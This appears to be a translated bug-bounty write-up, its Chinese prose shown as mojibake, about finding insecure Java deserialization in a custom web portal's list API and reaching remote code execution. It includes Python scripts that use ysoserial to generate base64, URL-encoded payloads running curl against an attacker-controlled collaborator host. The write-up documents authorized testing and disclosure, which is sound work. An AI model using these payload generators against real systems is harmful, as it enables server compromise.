# Java Web åº”ç”¨ç¨‹åºä¸Šçš„ RCE çš„æ•…äº‹

> åŸæ–‡ï¼š<https://infosecwriteups.com/the-story-of-a-rce-on-a-java-web-application-2e400cddcd1e?source=collection_archive---------0----------------------->

å¤§çº¦ä¸¤ä¸ªæœˆå‰(2021 å¹´ 11 æœˆ)ï¼Œæˆ‘å—é‚€å‚åŠ äº†ä¸€ä¸ªç§äººé¡¹ç›®ã€‚æ ¹æ®ä»–ä»¬çš„ç¨‹åºèŒƒå›´ï¼Œæˆ‘å†³å®šé»‘ä»–ä»¬ä¸€æ®µæ—¶é—´ã€‚è¿™ç¯‡æ–‡ç« æ˜¯å…³äºæˆ‘åœ¨è¿™å®¶å…¬å¸å‘ç°çš„ä¸€ä¸ªå¯¼è‡´ RCE çš„æ¼æ´ã€‚

# ä¾¦å¯Ÿ

åœ¨è¿™ä¸€æ­¥ï¼Œæˆ‘çš„ä¾¦æŸ¥æ–¹æ³•æ²¡æœ‰å‘ç°ä¸€äº›ç‹¬ç‰¹çš„å­åŸŸæˆ–èµ„äº§ã€‚æˆ‘åœ¨æœç´¢ä¸€äº›å…·æœ‰ä¸€äº›æœ‰è¶£åŠŸèƒ½çš„ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œæ¯”å¦‚ç™»å½•æˆ–æ–‡ä»¶ä¸Šä¼ ã€‚è¿‡äº†ä¸€ä¼šå„¿ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„å…¥å£ã€‚

åœ¨æ¥ä¸‹æ¥çš„å†…å®¹ä¸­ï¼Œä¸ºäº†å­¦ä¹ å®ƒçš„åŠŸèƒ½ï¼Œæˆ‘ä¸å¾—ä¸é‡æ–°å®šä½é—¨æˆ·æœ¬èº«ã€‚ä½œä¸ºä¸€ä¸ªæ­£å¸¸çš„å¥—è·¯ï¼Œæˆ‘å°è¯•ä»¥ä¸€ä¸ªæ­£å¸¸ç”¨æˆ·çš„èº«ä»½ä½¿ç”¨ web åº”ç”¨(å¦‚æœä½ ä¸äº†è§£åº”ç”¨çš„æ­£å¸¸æµç¨‹ï¼Œä½ æ˜¯æ— æ³•ç ´è§£çš„)ã€‚æˆ‘å†™ä¸‹é‡è¦çš„äº‹æƒ…ï¼Œç„¶åæ‰“å¼€æ‰“å—ã€‚

# å‘ç°

æˆ‘è¢«é—¨æˆ·å¸å¼•æ˜¯å› ä¸ºå®ƒæ˜¯å®šåˆ¶çš„ï¼Œè¿™ç§é—¨æˆ·ã€CMSes æˆ–è®ºå›é€šå¸¸æ¯”å…¬å…±ç‰ˆæœ¬(å¦‚ WordPress)æ›´å®¹æ˜“å—åˆ°æ”»å‡»ã€‚åœ¨ Burp ä¸­æ•è·è¯·æ±‚æ—¶ï¼Œæˆ‘ä¸€ç›´åœ¨æµ‹è¯•å„ä¸ªéƒ¨åˆ†ï¼Œç›´åˆ°åˆ°è¾¾ä¸€ä¸ªåŒ…å«åˆ—è¡¨çš„é¡µé¢ï¼Œå½“æˆ‘æ»šåŠ¨è¯¥é¡µé¢æ—¶ï¼ŒJava Script å‘é€äº†ä¸€ä¸ª Ajax è¯·æ±‚æ¥åŠ è½½æ›´å¤šçš„è¡Œã€‚è¯·æ±‚æ˜¯è¿™æ ·çš„:

```
[https://target.com/api/v1/list?size=25&after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==](https://target.com/api/v1/list?size=25&after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==)
```

![](img/bbaf0bdd039ae2f4cb0a68c7745e9e4f.png)

æˆ‘å°è¯•çš„ç¬¬ä¸€ä»¶äº‹æ˜¯è§£ç `after`å‚æ•°å€¼(å¦‚ä½ æ‰€çŸ¥ï¼Œæ˜¯ base64)ã€‚å®ƒæœ‰ä¸€ä¸ªäºŒè¿›åˆ¶å€¼ï¼Œä½†ä¸€äº›å­—ç¬¦è§£ç æˆåŠŸ:

![](img/9691e9e6df090e96476b02a3c7a224cb.png)

æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œ`java`è¢«è§£ç äº†ï¼Œæˆ‘çŒœæ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å€¼(é€šè¿‡ä¸€äº›ç ”ç©¶ï¼Œæˆ‘å¾ˆç¡®å®šï¼Œå› ä¸ºå®ƒæ˜¯ä»¥`rO0`å¼€å§‹çš„)ã€‚

# ååºåˆ—åŒ–

å¦‚æ‚¨æ‰€çŸ¥ï¼Œåºåˆ—åŒ–æ˜¯å°† [](https://en.wikipedia.org/wiki/Data_structure) æ•°æ®ç»“æ„æˆ– [](https://en.wikipedia.org/wiki/Object_(computer_science)) å¯¹è±¡çŠ¶æ€è½¬æ¢ä¸ºå¯å­˜å‚¨(ä¾‹å¦‚ï¼Œåœ¨æ–‡ä»¶ä¸­)æˆ–å¯é€šè¿‡ç½‘ç»œä¼ è¾“çš„æ ¼å¼çš„è¿‡ç¨‹ã€‚ç›¸åçš„æ“ä½œï¼Œä»ä¸€ç³»åˆ—å­—èŠ‚ä¸­æå–ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå°±æ˜¯**ååºåˆ—åŒ–** ( [ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Serialization))ã€‚

ä¸€äº›ç¨‹åºä½¿ç”¨åºåˆ—åŒ–æ¥å­˜å‚¨çŠ¶æ€ï¼Œç„¶åä½¿ç”¨ååºåˆ—åŒ–æ¥æ¢å¤çŠ¶æ€(å°±åƒæˆ‘ä»¬æµ‹è¯•çš„ web åº”ç”¨ç¨‹åºä¸€æ ·)ã€‚ä½†æ˜¯å¦‚æœç¨‹åºååºåˆ—åŒ–ä¸€ä¸ªä¸å®‰å…¨çš„è¾“å…¥ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œæ˜¯**ä¸å®‰å…¨ååºåˆ—åŒ–**å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚åœ¨è¿™ä¸ªæ¼æ´ä¸­(ä¹Ÿåœ¨ OWASP A8:2021 ä¸­)ï¼Œæ”»å‡»è€…å‘é€ä»–ä»¬çš„æ¶æ„åºåˆ—åŒ–å€¼ä½œä¸ºæ˜“å—æ”»å‡»ç¨‹åºçš„è¾“å…¥ã€‚è¿™é€šå¸¸ä¼šå¯¼è‡´ç‰¹æƒå‡çº§å’Œ RCEã€‚ä¸å®‰å…¨çš„ååºåˆ—åŒ–åœ¨å„ç§ç¼–ç¨‹è¯­è¨€ä¸­éƒ½æœ‰å‘ç”Ÿï¼Œä½†æˆ‘ä¸»è¦å…³æ³¨ Javaã€‚

![](img/b4ea25ad08e3d9b714461b649c2106a2.png)

geeksforgeeks.com

# æ¼æ´

æˆ‘ä¹‹å‰æåˆ°è¿‡ï¼Œåœ¨å¯¹åºåˆ—åŒ–å€¼è¿›è¡Œè§£ç ä¹‹åï¼Œæˆ‘å¼€å§‹ç ”ç©¶ Java ä¸­çš„ååºåˆ—åŒ–(è™½ç„¶æˆ‘å¯¹ç™½ç›’çš„ä¸œè¥¿ä»æ¥ä¸æ„Ÿå…´è¶£ï¼Œä½†æ˜¯æˆ‘ä¹Ÿç ”ç©¶äº† Java ä¸­çš„åºåˆ—åŒ–å‡½æ•°:)ã€‚ä½œä¸ºç ”ç©¶çš„ç»“æœï¼Œæˆ‘äº†è§£åˆ°æˆ‘ä»¬å¯ä»¥ä»¥ä¸åŒçš„æ ¼å¼ç»™å‡ºåºåˆ—åŒ–çš„è¾“å…¥ï¼Œä¾‹å¦‚:

```
Hex signature      ->   AC ED 00 05Base64 signature   ->   rO0
```

ç›®æ ‡ä½¿ç”¨ base64ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥ä¸º RCE åˆ›å»ºæ¶æ„çš„åºåˆ—åŒ–è¾“å…¥ï¼Œä½†åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬åº”è¯¥ç¡®ä¿ç›®æ ‡æ˜¯æ˜“å—æ”»å‡»çš„ã€‚è¿™é‡Œæˆ‘æœ‰ä¸¤ç§æ–¹æ³•:1ã€‚ç”¨ Java å†™ä¸€ä¸ª PoC ä»£ç (æˆ‘å½“æ—¶ä¸æ‡‚ Java ) 2ã€‚å…¬å¼€ä½¿ç”¨å¯ç”¨çš„ PoC ä»£ç ã€‚æˆ‘å¾ˆç¡®å®šç¬¬äºŒç§æ–¹å¼å¯¹æˆ‘æ¥è¯´æ›´å¥½(å°½ç®¡æˆ‘ä¸æƒ³æˆä¸ºä¸€ä¸ªè„šæœ¬å°å­)ã€‚äºæ˜¯æˆ‘å¼€å§‹åœ¨ GitHub é‡Œæœç´¢ä¸€äº› PoC ä»£ç ï¼Œæ‰¾åˆ°äº† [**ysoserial**](https://github.com/frohoff/ysoserial) ã€‚è¯¥å·¥å…·æ ¹æ®åŠŸèƒ½æˆ–ç‰ˆæœ¬ç”Ÿæˆå„ç§æœ‰æ•ˆè½½è·ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰æ•ˆè½½è·æ˜¯ *URLDNS* ï¼Œä½ å¯ä»¥ç»™å®ƒä¸€ä¸ª URLï¼Œå®ƒå°±ä¼šç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆè½½è·ã€‚å¦‚æœæˆ‘ä»¬ç»™å‡ºç”Ÿæˆçš„æœ‰æ•ˆè½½è·å¹¶ä»æœåŠ¡å™¨è·å¾— DNS æŸ¥è¯¢ï¼Œç¨‹åºå°±å®¹æ˜“å—åˆ°æ”»å‡»ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘å¿…é¡»è¿›è¡Œå¸¦å¤–æµ‹è¯•ï¼Œä»¥ç¡®ä¿åº”ç”¨ç¨‹åºæ˜“å—æ”»å‡»ã€‚æˆ‘ç”Ÿæˆäº†æœ‰æ•ˆè½½è·ï¼Œå¹¶æŠŠå®ƒäº¤ç»™äº† web åº”ç”¨ç¨‹åºï¼›

![](img/f45cd05b725e8175ef32c968488970be.png)

æˆ‘æ”¶åˆ°ä¸€äº› DNS æŸ¥è¯¢ï¼Œç›®æ ‡å¾ˆè„†å¼±ã€‚è®©æˆ‘ä»¬åˆ©ç”¨å®ƒã€‚

# å‰¥å‰Š

æˆ‘ç¡®ä¿¡æˆ‘å¯ä»¥åˆ©ç”¨å®ƒï¼Œä½†æœ‰ä¸€ä¸ªé—®é¢˜ã€‚æˆ‘åˆç”¨äº† ysoserial ä½†æ˜¯æˆ‘å¾ˆéœ‡æƒŠï¼Œå› ä¸ºå®ƒä¸èµ·ä½œç”¨(è‡³å°‘æˆ‘æ²¡æœ‰æ‰¾åˆ°ä»»ä½•åˆé€‚çš„æœ‰æ•ˆè½½è·)ã€‚æˆ‘æ”¾å¼ƒäº†ï¼Œå¼€å§‹åœ¨é—¨æˆ·ä¸Šå¯»æ‰¾å…¶ä»– bugã€‚

2-3 å‘¨åï¼Œæˆ‘å†³å®šå†åšä¸€æ¬¡ã€‚åƒä»¥å‰ä¸€æ ·ï¼Œæˆ‘ä¸å¾—ä¸æƒ³åŠæ³•:1ã€‚ç”¨ Java 2 ä¸º RCE ç¼–å†™ä¸€ä¸ªæ¼æ´åˆ©ç”¨ä»£ç ã€‚åœ¨ GitHub(æˆ–ä»»ä½•åœ°æ–¹)å¯»æ‰¾æ¼æ´ä»£ç ã€‚æˆ‘é€‰æ‹©äº†ç¬¬äºŒç§æ–¹å¼(é€šå¸¸ä¼šæœ‰æ¼æ´ä»£ç )ã€‚è¿™ä¸€æ¬¡ï¼Œæˆ‘å‘ç°äº†ä¸€äº›å¸¦æœ‰ä¸€äº›é¢å¤–è´Ÿè½½/é€‰é¡¹çš„ ysoserial forksã€‚æˆ‘æ— æ³•æ‰‹åŠ¨æµ‹è¯•è¿™äº›æœ‰æ•ˆè½½è·(å®ƒä»¬å¤ªå¤šäº†)ã€‚å› æ­¤ï¼Œæˆ‘ç¼–å†™äº†ä¸€ä¸ª python è„šæœ¬æ¥ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚ç„¶åæˆ‘æŠŠé‚£ä¸ªæ–‡ä»¶ç»™äº†æ‰“é¥±å—çš„å…¥ä¾µè€…ï¼Œä½†è¿˜æ˜¯æ²¡ç”¨ã€‚è¯¥è„šæœ¬çš„æœ€ç»ˆç‰ˆæœ¬æ˜¯è¿™æ ·çš„:

```
import os

modes = [] # All payload names here

collab = "attacker.com"
payload = f"curl -s https://rce.{collab}/poc"

for i in range(0,6):

    for mode in modes:
            result = os.popen('java -jar ysoserial' + f"{i}" + '.jar ' + mode + ' "' + payload + '" | base64 -w 0').read()

    if result != "":
            print(result)
    else:
            print("Donno but something is going wrong :/")
```

# ç¬¬äºŒæ¬¡å°è¯•

å½“æˆ‘æ²¡æœ‰æ”¶åˆ°ç›®æ ‡çš„ä»»ä½•è¯·æ±‚æ—¶ï¼Œæˆ‘æœ‰ç‚¹æ”¾å¼ƒäº†ï¼Œä½†æ˜¯æˆ‘çœ‹äº†çœ‹å›åº”ã€‚ä¸€äº›çŠ¶æ€ä»£ç æ˜¯ 400ï¼Œæˆ–è€…å…¶ä»–ä¸€äº›å“åº”åŒ…å« Java é”™è¯¯ã€‚é€šè¿‡ä¸€äº›æ•…éšœæ’é™¤ï¼Œæˆ‘æ³¨æ„åˆ° base64 ä¸­çš„ä¸€äº›å­—ç¬¦ç ´åäº†è¯·æ±‚(ä¾‹å¦‚`+`)ã€‚æ‰€ä»¥æˆ‘å¿…é¡»åœ¨ä¿å­˜ä¹‹å‰ä¿®æ”¹æˆ‘çš„ python è„šæœ¬å’Œ URL ç¼–ç ã€‚ç¬¬äºŒæ¬¡ï¼Œæˆ‘æŠŠæ–°å•è¯è¡¨ç»™äº†æ‰“å—çš„å…¥ä¾µè€…ï¼Œå‡ ç§’é’Ÿå:

![](img/4bbc44afb753dd262e805c8c37014c5d.png)

è¿™æ„å‘³ç€æˆ‘èƒ½å¤Ÿåœ¨æœåŠ¡å™¨(RCE)ä¸Šæ‰§è¡Œæˆ‘çš„å‘½ä»¤ã€‚åœ¨æ‰¾åˆ°æ­£ç¡®çš„æœ‰æ•ˆè´Ÿè½½å’Œæ­£ç¡®çš„ ysoserial åˆ†æ”¯åï¼Œæˆ‘ç”¨ Python ç¼–å†™äº†ä¸€ä¸ªæ¼æ´åˆ©ç”¨ä»£ç ï¼Œä»¥ä¾¿äºå¤åˆ¶:

```
import os
import urllib.parse

mode = "THAT_FOUNDED_SUITABLE_MODE"

collab = input("Enter your collaborator domain (e.g. attacker.com)> ")
payload = f"curl -s https://{collab}/poc"

result = os.popen('java -jar ysoserial4.jar ' + mode + ' "' + payload + '" | base64 -w0').read()

encoded = urllib.parse.quote_plus(result)

if encoded != "":
    print("Copy the following payload:\n\n")
    print(encoded)
else:
    print("Donno but something is going wrong :/")
```

æœ€åæˆ‘åˆ›å»ºäº†`/tmp/poc.txt`å¹¶æŠ¥å‘Šäº†æ¼æ´ã€‚å¯¹äº PoCï¼Œè¿™å°±è¶³å¤Ÿäº†ã€‚

# ç»éªŒæ•™è®­

*   æ€»æ˜¯è§£ç ä»»ä½• base64 æˆ–å…¶ä»–ç¼–ç æ–‡æœ¬ã€‚
*   å…¬å…±å·¥å…·æ˜¯å¥½çš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ç”¨ Java ç¼–å†™è‡ªå·±çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæˆ‘ä¼šæ›´å¿«åœ°å‘ç°è¿™ä¸ªæ¼æ´ã€‚
*   æ€»æ˜¯æµ‹è¯•æ¯ä¸ªåŠŸèƒ½ï¼Œæœ‰æ—¶ï¼Œä½ å¿…é¡»æ»šåŠ¨é¡µé¢:)
*   æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿä¸å¾—ä¸åšé‚£äº›æ— èŠçš„å·¥ä½œã€‚
*   é»˜è®¤æƒ…å†µä¸‹ï¼ŒBurp å…¥ä¾µè€…å¯¹ç»™å®šçš„æœ‰æ•ˆè½½è·è¿›è¡Œç¼–ç ã€‚ä½†æ˜¯è¿™ä¸ªç‰¹æ€§åœ¨æˆ‘çš„æ‰“å—ä¸­è¢«å…³é—­äº†ï¼Œè™½ç„¶æˆ‘åœ¨ Python è„šæœ¬ä¸­è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªç‰¹æ€§æ˜¯ä¸€ä¸ªæ›´å¥½çš„è§£å†³æ–¹æ¡ˆã€‚

# èµ„æº

*   [https://www.geeksforgeeks.org/serialization-in-java/](https://www.geeksforgeeks.org/serialization-in-java/)
*   [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
*   [https://www.baeldung.com/java-serialization](https://www.baeldung.com/java-serialization)
*   [https://www.javatpoint.com/serialization-in-java](https://www.javatpoint.com/serialization-in-java)
*   [https://www.tutorialspoint.com/java/java_serialization.htm](https://www.tutorialspoint.com/java/java_serialization.htm)

# ğŸ”ˆ ğŸ”ˆInfosec Writeups æ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰ 16 ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ 10 å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚[æŸ¥çœ‹æ›´å¤šè¯¦æƒ…å¹¶åœ¨æ­¤æ³¨å†Œã€‚](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec ä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®

### ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦

iwcon.live](https://iwcon.live/)